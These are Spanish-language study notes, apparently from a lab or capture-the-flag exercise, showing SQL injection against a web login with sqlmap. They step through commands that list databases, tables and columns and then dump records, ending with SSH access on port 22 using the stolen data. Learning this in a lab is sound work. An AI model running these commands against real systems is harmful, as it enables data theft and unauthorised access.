- Las inyecciones SQL acontecen en los login web.
![[Pasted image 20241219201913.png]]
- Vamos a usar la herramienta ==sqlmap==.
![[Pasted image 20241219202455.png]]
- Con esta herramienta podemos encontrar:
	- Bases de datos
		- Tablas, columnas y registros.
- Es importante tener conocimiento de SQL.
https://www.youtube.com/watch?v=FbGG_cyLUAc
- Usamos el siguiente comando:
```
sqlmap -u (URL_CORRESPONDIENTE) --forms --dbs --batch
```
![[Pasted image 20241219202912.png]]
- Encontramos los siguientes bases de datos:
![[Pasted image 20241219203414.png]]
- Nos interesa Webapp.
- Vamos a usar el siguiente comando utilizando Webapp:
```
sqlmap -u (URL_CORRESPONDIENTE) --forms -D (NOMBRE_BASE_DATOS) --tables --batch
```
![[Pasted image 20241219203707.png]]
- Nos encontró 1 tabla:
![[Pasted image 20241219203836.png]]
- Que hay dentro de esta tabla?, Columnas.
- Para ver que columnas posee vamos a usar el siguiente codigo:
```
sqlmap -u (URLS_CORRESPONDIENTE) --forms -D (NOMBRE_BASE_DATOS) -T (TABLA) --columns --batch
```
![[Pasted image 20241219204140.png]]
- Nos da las siguientes columnas.
![[Pasted image 20241219204516.png]]
- Ahora vamos a ver los registros de las columnas con el siguiente código:
```
sqlmap -u (URLS_CORRESPONDIENTE) --forms -D (NOMBRE_BASE_DATOS) -T (TABLA) -C(COLUMNAS) --dump --batch
```
![[Pasted image 20241219204737.png]]
- Ya tenemos toda la información que necesitamos:
![[Pasted image 20241219205227.png]]
- Ya con esto podemos entrar por el puerto 22.